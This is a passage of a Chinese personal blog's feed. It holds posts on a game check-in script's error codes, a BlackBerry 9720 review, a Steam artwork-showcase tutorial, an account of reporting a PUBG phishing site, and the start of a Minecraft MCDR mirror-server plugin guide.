href="https://github.com/apps/pull">点击这里</a>安装插件，可以选择所有仓库，也可以指选择你Fork的仓库（当然至少要选择fork的仓库对吧，要不然怎么更新），然后不管它就好了</p><p>详细步骤可以看下面的图片</p><p><img src="https://upimage.alexhchu.com/2020/12/26/4c0d02795a38c.png"></p><p><img src="https://upimage.alexhchu.com/2020/12/26/1800e5609a365.png"></p><p><img src="https://upimage.alexhchu.com/2020/12/26/29ffcfd4fd8b0.png"></p><p>如果你完成了上面的步骤，就可以不管它了，自动更新会自己进行（除非有<code>Merge Conflict</code>）</p><h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a>手动更新</h3><p>在自己的仓库中，创建一个pull requests，上游（右边的选择本仓库（GamerNoTitle&#x2F;wyycg-autocheckin）的master分支，左边选择自己的仓库，然后创建PR并Merge即可！</p><p>具体可以看下面的图片</p><p><img src="https://upimage.alexhchu.com/2020/12/26/660bffa186f57.png"></p><p><img src="https://upimage.alexhchu.com/2020/12/26/b90770108e301.png"></p><p><img src="https://upimage.alexhchu.com/2020/12/26/da988092d8556.png"></p><p><img src="https://upimage.alexhchu.com/2020/12/26/444ca5bc88093.png"></p><p><img src="https://upimage.alexhchu.com/2020/12/26/db022886a1c5f.png"></p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h2 id="返回值400并附带一串不知道什么鬼的字符串"><a href="#返回值400并附带一串不知道什么鬼的字符串" class="headerlink" title="返回值400并附带一串不知道什么鬼的字符串"></a>返回值400并附带一串不知道什么鬼的字符串</h2><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">感谢使用来自GamerNoTitle的网易云游戏自动签到脚本！</span><br><span class="line">今日签到结果如下：</span><br><span class="line">成功数量：0/1</span><br><span class="line">失败数量：1/1</span><br><span class="line">具体情况如下：</span><br><span class="line">第1个账号签到失败，回显状态码为400，具体错误信息如下：GL8B/hH+v9cYGsm/Ag8PAAwBAr/XztPNzsm/Ag8PChAEv9e/EhACD70QBgQLvREMAf4Wv8m/Ag8PChAEAAu/17/5EtID0tD5EtLWz9b5EtIBA8/5EtT/1AL5EtLP0M2/Gqc=</span><br><span class="line">GamerNoTitle: https://bili33.top</span><br><span class="line">网易云游戏自动签到脚本: https://github.com/GamerNoTitle/wyycg-autocheckin</span><br></pre></td></tr></table></figure><p>首先你需要确认你当天是否已经签到过了才运行的脚本，如果确实先签了到再运行脚本，网易确实会返回400</p><p>目前也只发现这种情况会返回400，如果有其他情况你可以在issue跟我提出</p><h2 id="错误代码"><a href="#错误代码" class="headerlink" title="错误代码"></a>错误代码</h2><h3 id="telepot-exception-TelegramError"><a href="#telepot-exception-TelegramError" class="headerlink" title="telepot.exception.TelegramError"></a>telepot.exception.TelegramError</h3><h4 id="Chat-not-found"><a href="#Chat-not-found" class="headerlink" title="Chat not found"></a>Chat not found</h4><p>请先用你要接受信息的账户发个<code>/start</code>给你的bot，或者检查用户ID是否正确！</p><h4 id="Not-found"><a href="#Not-found" class="headerlink" title="Not found"></a>Not found</h4><p>请检查自己的Telebot Token是否正确！</p><h3 id="urllib3-exceptions"><a href="#urllib3-exceptions" class="headerlink" title="urllib3.exceptions"></a>urllib3.exceptions</h3><h4 id="MaxRetryError"><a href="#MaxRetryError" class="headerlink" title="MaxRetryError"></a>MaxRetryError</h4><p><code>HTTPSConnectionPool(host=&#39;api.telegram.org&#39;, port=443): Max retries exceeded with url: /botxxxx/sendMessage</code></p><p>出现这个错误，那就是Telegram的问题，Github连接不上Telegram服务器（大半是TG服务器炸了）</p><h4 id="ReadTimeoutError"><a href="#ReadTimeoutError" class="headerlink" title="ReadTimeoutError"></a>ReadTimeoutError</h4><p><code>HTTPSConnectionPool(host=&#39;api.telegram.org&#39;, port=443): Read timed out. (read timeout=30)</code></p><p>出现这个错误，那就是Telegram的问题，Github连接不上Telegram服务器（大半是TG服务器炸了）<del>（复制粘贴大法）</del></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽08 - 换用Blackberry9720三个月后的感受</title>
      <link href="/posts/diary8/"/>
      <url>/posts/diary8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>先给你们看看我的Blackberry9720（下图）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/BB.jpg"></p><p>因为我的索爱在8月的时候听筒听不见声音了（平时使用其实没多大问题，主要是打电话……），所以我就换上了这台高一同学给的BB9720</p><p>让我来总结一下使用体验</p><hr><h3 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h3><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201026_220918.jpg" alt="先放一张手机桌面"></p><p>日常使用其实跟索爱没啥区别，就是键盘是26键，系统也是BBOS7不是塞班</p><p>打电话？NP！发短信？NP！索爱能做的它都能做</p><p>不过跟索爱也有同样的问题：SSL证书不信任</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201006_221644.jpg" alt="这可真是个灾难（背后网站是萌娘百科）"></p><p>访问某些网站，证书比较新的那种，就会出现这个问题……（难受+1）</p><p>不过其他还是NP的，收邮件这一块我安装了一个LogicMail（主要是因为不能企业激活，毕竟服务商是MTN）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_110122.jpg" alt="LogicMail主界面"></p><p>不过有的时候LogicMail会抽风（指Opening Connection这个步骤会直接失败），就需要一波硬重启（因为黑莓的重启有两种，一种是平常长按电源键关机后开机，那种开机很快，大约10~15s就完成了，另一种是拆电池，这样的重启会长达5分钟，主要是需要加载所有的应用程序），但是我不想每次都拔电池，所以我用了一个QuickPull来硬重启</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_103818.jpg" alt="QuickPulllllllllllllllllllllllllll!!!"></p><hr><h3 id="耗能体验"><a href="#耗能体验" class="headerlink" title="耗能体验"></a>耗能体验</h3><p>总的来说，如果一天重度使用（指经常浏览网页，看视频等），连半天都撑不过去（毕竟是旧手机）</p><p>不过按照我的使用习惯，两天一充还是可以的，不过充电速度有点……</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_103757.jpg" alt="激泪的充电速度"></p><p>电池只有2000mAh，只能说还行</p><hr><h3 id="娱乐体验"><a href="#娱乐体验" class="headerlink" title="娱乐体验"></a>娱乐体验</h3><h4 id="微信"><a href="#微信" class="headerlink" title="微信"></a>微信</h4><p>一句话：<strong>完 全 不 能 用！！！</strong></p><p>微信好像已经被腾讯放弃了（事实也是如此，QQ同理），一直在这里转圈</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_103746.jpg" alt="BBOS7的微信"></p><h4 id="看片"><a href="#看片" class="headerlink" title="看片"></a>看片</h4><p>只能看720P以下的视频，只支持主流的格式（不包括FLV）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_104033.jpg" alt="看不玩不活零"></p><p>一定要下载好，不过体验还行:D</p><h4 id="听歌"><a href="#听歌" class="headerlink" title="听歌"></a>听歌</h4><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_103722.jpg" alt="听Brain Power"></p><blockquote><p><a href="https://zh.moegirl.org.cn/Brain_Power">O-oooooooooo AAAAE-A-A-I-A-U- JO-oooooooooooo AAE-O-A-A-U-U-A- E-eee-ee-eee AAAAE-A-E-I-E-A- JO-ooo-oo-oo-oo EEEEO-A-AAA-AAAA</a></p></blockquote><p>也是要下载好，不过可以听FLAC就好评（索爱不行）</p><h4 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h4><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_104052.jpg" alt="英语作文练习"></p><p>就很NICE，索爱不能看文档，BlackBerry除了可以看docx还能看pptx、xlsx、pdf，就很舒服</p><h4 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h4><p>我就装了个2048（益智游戏）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_11204.jpg" alt="2048菜鸡分数"></p><h3 id="软件体验"><a href="#软件体验" class="headerlink" title="软件体验"></a>软件体验</h3><p>有独立的软件商店，可以安装软件，但是我不知道怎么从第三方安装软件</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_111555.jpg" alt="软件商店"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201115_111637.jpg" alt="已购列表"></p><p>但是有点问题就是，免费软件有广告，会推送到邮件客户端里面（不是LogicMail，是内置的那个邮件客户端）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary8/Screen_20201112_063546.jpg" alt="垃圾广告"></p><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说，BlackBerry9720给我的体验还算不错，反正就剩下一年了，拿来临时用一用还是可以的</p><hr><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>界面是英文是因为中文字体看不惯才换的，并不是只有英文</p><p>月考考完了，芜湖起飞！</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steam资料美化 —— 让你的展柜变得好看！</title>
      <link href="/posts/Steam-Artwork/"/>
      <url>/posts/Steam-Artwork/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你也想拥有想别人那样Steam资料有自己喜欢的人物嘛？你也想自己动动手，让自己的Steam资料变得好看吗？现在你不需要去某宝&#x2F;某东，只要你跟着做，你就能够做到！</p><p>观前提示：本教程全程使用Photoshop（包括模板文件），请自备该软件~（另：抠图不是我应该教的）</p><p>话不多说，先上一张效果图（你也可以到<a href="https://steamcommunity.com/id/bili33/">我的Steam个人资料</a>页面查看）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/cover.png" alt="效果图"></p><hr><h3 id="找图"><a href="#找图" class="headerlink" title="找图"></a>找图</h3><p>找图当然是最重要的呀，没有图哪里来的背景……如果你的Steam个人资料没有背景，你可以去<a href="https://store.steampowered.com/points/shop/">点数商店</a>换一个自己喜欢的（点数确实挺难赚的就是了，G胖心里偷喜）</p><p>接着我们打开自己的Steam库存，选择你想用来做背景的图，点击查看完整大小</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/showfull.png" alt="查看完整大小"></p><p>你可以直接点击它，你也可以右键复制链接地址，反正我们需要的是链接</p><p>接着我们打开<a href="https://steam.design/">Steam.Design</a>，把自己的链接贴进去点”Change BG”，然后点Download Images</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/SteamDesign.png" alt="操作步骤"></p><p>下载下来是个压缩包，我们只要里面的<code>Artwork_Middle.png</code>和<code>Artwork_Right_Top.png</code>即可，如果你对头像也有要求可以把<code>Avatar.png</code>也用上，但是本教程不涉及</p><p>至于人物图嘛……<a href="https://www.pixiv.net/">P站</a>很多自己找吧</p><h3 id="裁剪"><a href="#裁剪" class="headerlink" title="裁剪"></a>裁剪</h3><p>接下来就是要Photoshop的时候了，我会完整告诉你怎么弄，当然你也可以直接下载我提供的<a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/Tamplate.psd">模板（懒人必备）</a>，可以省去切片的步骤，直接把图片拖进去然后保存即可</p><p>我们先新建一个607*942的空白画布，如图</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/NewFile.png" alt="新建画布"></p><p>打开来就是一个纯空白的文件，接着把我们下载的两个图片拖进去</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/DrugIn.png" alt="拖~进去"></p><p>然后把两个图片分别拖到左右两边，大的在做，小的在右。如果你操作正确的话中间会留下一列空白（纯色）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/CorrectlyOperated.png" alt="正确操作"></p><p>接着把自己的人物图放进去（请先自己扣好图），如果人物被挡住了需要把人的那一个图层向上移动（两个背景图层没有顺序要求，但是人物一定要在上面）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/Upward.png" alt="图层排列"></p><p>重点来了！选择切片工具（如果你没有切片工具，请右键裁切工具选择切片工具）<img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/Tool.png" alt="工具选择"></p><p>从透明的那一列开始往下拉到底，将图划分为三个区域（因为透明那一列也是一个区域）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/Cutting.png" alt="划分区域"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/Devided.png" alt="区域显示"></p><p>如果你不放心自己是否裁切对了，你可以按住<code>Alt</code>+<code>鼠标滑轮上</code>放大来检视自己的操作，如果不对，就可以将切片线移动到正确位置</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/ShowDetail.png" alt="放大检视"></p><p>最后我们按住<code>Ctrl</code>+<code>Alt</code>+<code>Shift</code>+<code>S</code>，进行文件的保存（<strong>品质手动拉到100</strong>）文件名随便你，反正我们用不到文件名，裁剪就完成了</p><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>我们打开<a href="https://steamcommunity.com/sharedfiles/edititem/767/3/">Steam艺术作品上传页面</a>（需要梯子或者Steamcommunity302），添加自己的文件，给自己的作品命名</p><p>重点来啦！按F12打开开发者工具，选择console，将以下的代码复制进去按回车运行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num= <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;image_width&quot;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;image_height&quot;</span>)[<span class="number">0</span>].<span class="property">value</span> = num-(num-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;image_width&quot;</span>)[<span class="number">0</span>].<span class="property">value</span>= num*<span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>最后会得到一行数字（两个数字的结果不一样，第一个是<code>50600</code>，第二个是<code>10000</code>，两个都要运行）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/DeveloperTool.png" alt="开发者工具"></p><p>上传完成后我们点到Steam编辑个人资料，选择艺术作品展柜，并将自己的艺术作品展示出来，保存</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/Edit.png" alt="修改个人资料展柜"></p><p>这样你就得到了属于你自己的Steam个人资料页面了！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Steam-Artworks/cover.png" alt="效果图"></p><hr><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>最近Leancloud国际版又崩了……评论获取不到，烦……</p><p>原神挺好玩的，虽然我每天有一个半小时的限制……</p><p>CSGO的排位还没打完哭了……昨晚三连跪了</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽07 - 记录一次成功的举报经历</title>
      <link href="/posts/diary7/"/>
      <url>/posts/diary7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note danger flat"><p>在这里仅记录我成功举报的一次经历，希望大家引以为戒，同时，我不玩PUBG，也不用约我打PUBG</p><p>另外，我在发邮件的过程中忘记用其他邮箱了，也就是我用了我的域名邮箱<a href="mailto:admin@bili33.top">admin@bili33.top</a>，如果现在在看本文的是那位办网站的老兄，请你记住：不管有多少这样的网站，只要我遇到了，通通举报！我不会改变我的做法，我希望弄这些钓鱼网站的人更少，同时给PUBG一个良好的游戏环境！</p></div><p>前几天我在浏览Steam商城，因为当时没啥好玩的了，想去看看有啥游戏，结果发现了下面这样的信息（我看到的是评测中的信息，忘记截图了，而且那个用户也被我举报并屏蔽且被V社处理了，这里是一张<strong>网上的图</strong>，我遇到的给的链接是<font color=#FF0000>pubgjosn.fun</font>（危险别点））</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/Phishing-Message.png" alt="网图"></p><p>点进去用户界面，看到是个把个人信息设置为隐私的账户（<strong>此处仍然为网上的图</strong>）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/userinfo.png" alt="还是网图"></p><p>我点进去一看，哟，这不是钓鱼网站嘛，长得还挺像PUBG的官网，不过开篇就是给枪皮，这价值我也不知道有多少，反正看这域名就不是官方网站</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/Unofficial-website.png" alt="非官方网站"></p><p>我试着在这个页面点击除了领取以外的按钮，发现就连阅读个新闻也要登录，这不符合逻辑，看来这个网站没啥，也就UI像了点，其他没啥</p><p>弹出来给我的Steam登录界面，地址栏写的是about:blank，也就是所谓的空白页，但是按照Steam的登录页面的逻辑，他应该是会写<a href="about:blank">https://steamcommunity.com/?XXXXX</a>之类的，这肯定也是个钓鱼的登录界面，随便输入个账号，就要手机验证码，骗谁呢~</p><p>接着，我去查了一下whois，发现他的DNS解析在CloudFlare，因为听说CloudFlare有停止解析服务这一说，所以我就去CloudFlare投诉了一波（投诉界面忘记截图了）</p><p>第二天早上起来，发现CloudFlare给我发了封邮件</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/Response-of-Cloudflare.png" alt="CF的邮件"></p><p>接着，我访问该网站，发现已经被挂上了红色警告</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/Unofficial-website-warning.png" alt="CF小红信"></p><p>CloudFlare这波干的不错，返回来看CF给我发的邮件，里面还说到了以下几种方法（黄色部分，这里是在mail.ru，也就是我的域名邮箱托管的平台）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/tips-of-Cloudflare.png" alt="CF的提示"></p><p>然后我又去查了一次whois，发现他是在reg.ru这个网站上注册的域名，接着我又去查这个网站的举报方式，发现了<a href="mailto:abuse@reg.ru">abuse@reg.ru</a>这个举报邮箱</p><p>接着再发一封邮件，提出这种情况</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/mailto-reg-dot-ru.png" alt="发邮件给reg.ru"></p><p>不久后便收到了来自该域名注册平台的邮件</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/replyfrom-reg-dot-ru.png" alt="REG.RU的回复"></p><p>举报完成，收工！</p><p>在我即将开始写文的时候，发现我的Steam弹了一条V社的信息</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary7/message-from-valve.png" alt="V社的信息"></p><p>这次举报真的大快人心！</p><p>下次继续！</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MCDR-Mirror-Server使用手册和例子 | The usage and example of MCDR-Mirror-Server</title>
      <link href="/posts/MCDR-Mirror-Server-Usage/"/>
      <url>/posts/MCDR-Mirror-Server-Usage/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="简体中文"><a href="#简体中文" class="headerlink" title="简体中文"></a>简体中文</h1><div class="note info flat"><p>感谢你选用<a href="https://github.com/GamerNoTitle/MCDR-Mirror-Server">MCDR-Mirror-Server</a>作为MCDR镜像服插件，本页面是镜像服插件的一个例子，希望你看了这个例子能够更加清楚镜像服插件的工作原理和使用方法(*^▽^*)</p></div><p><strong><a href="#English">English users please click me!</a></strong></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>首先，我们需要下载<a href="https://github.com/GamerNoTitle/MCDR-Mirror-Server">MCDR-Mirror-Server</a>插件，你可以在<a href="https://github.com/GamerNoTitle/MCDR-Mirror-Server">Github仓库</a>下载，对于中文用户，请下载<code>mirror.py</code>和<code>mirror.json</code></p><p>接着，把<code>mirror.py</code>放入MCDR的Plugins文件夹，把<code>mirror.json</code>放入MCDR的config文件夹，这样，插件的位置就到位了</p><p>在MCDR的目录下新建一个文件夹，或者在其他地方新建一个文件夹，用于存放镜像服的文件。</p><div class="note warning flat"><p><strong><font color=#FF0000>请注意！Windows用户请不要跨盘符建立文件夹，如果你的MCDR文件夹在C盘，那么你就把镜像服文件夹建立在C盘，请不要建立在D、E、F等盘（即禁止跨盘符建立文件夹），这是由于cmd的盘符切换方法导致你在运行MCDR的时候无法切换到其他盘符</font></strong></p></div><p>将你的镜像服文件丢进你建立的文件夹内，可以带着MCDR进去，也可以不带，程序会自动判断是否带了MCDR</p><p>接着打开你的<code>mirror.json</code>文件，我们将要开始配置了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./mirror/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;world&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;world&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;python3 MCDReforged.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;remote&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;password&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">25575</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>首先，将<code>path</code>后面的内容改为你的文件夹路径，可以是相对路径也可以是绝对路径</p><p>将<code>world</code>后面的内容改为你的世界文件夹的名字，请注意需要按照列表的格式填写，即<code>[&quot;world&quot;,&quot;world1&quot;,&quot;world2&quot;]</code>等，将你所有的世界文件夹填入，如果你是原版服务器的话基本上只填写world是莫得问题的</p><p>将<code>command</code>改为你的镜像服启动的命令，例如<code>java -Xms2G -Xmx4G -jar server.jar</code>或者<code>python3 MCDReforged.py</code>等，如果你的镜像服也带了MCDR，你需要注意：Windows使用python的方式不是写作<code>python3</code>而是写作<code>py</code>或者<code>python</code>，linux则特定要写<code>python3</code></p><p>下面是rcon的相关配置，有关rcon的相关信息，你可以看<a href="https://www.zhihu.com/question/381405552/answer/1099552088">这里</a></p><p><code>enable</code>是是否开启rcon功能，如果开启了就可以使用rcon的功能，如果不开启就不行，相当于镜像服对镜像服rcon链接的总开关吧</p><p><code>address</code>是镜像服服务器的地址，如果你是同一台机子就填<code>127.0.0.1</code>即可，否则就要填写直连的地址</p><p><code>secret</code>填写镜像服的rcon密码，这个在<code>server.properties</code>里面设置的</p><p><code>port</code>填写镜像服的rcon端口，同样在<code>server.properties</code>设置</p><p><code>command</code>即是否允许利用<code>!!mirror rcon &lt;command&gt;</code>来对镜像服使用命令</p><p>填写完了以后，你仍然需要在server.properties里面修改端口，避免端口冲突</p><p>然后就可以在主服务器里<code>!!MCDR reload plugin</code>然后使用<code>!!mirror start</code>来尝试开启服务器了</p><h2 id="使用例子"><a href="#使用例子" class="headerlink" title="使用例子"></a>使用例子</h2><p>以我自己来说，我的目录树大概长这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MCDReforged</span><br><span class="line">├─config</span><br><span class="line">├─lang</span><br><span class="line">├─mirror</span><br><span class="line">│  ├─server</span><br><span class="line">│  │  └─world</span><br><span class="line">├─plugins</span><br><span class="line">├─resources</span><br><span class="line">├─server</span><br><span class="line">│  └─world</span><br><span class="line">└─utils</span><br></pre></td></tr></table></figure><p>我的mirror文件夹就是我的镜像服文件夹，里面放了MCDR作为镜像服的管理工具，原版服务器上了Fabric，使用Linux来开服，所以我的config是下面这样的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./mirror/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;world&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;world&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;python3 MCDReforged.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;remote&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;password&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">25575</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在mirror文件夹里面，我的文件大概如图所示（注：我开服的系统是linux，只是这里用Windows来浏览文件）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/MCDR-Mirror-Server-Usage/Mirror-Files.png" alt="Mirror文件夹的文件"></p><p>我的镜像服<code>server.properties</code>的内容如下</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 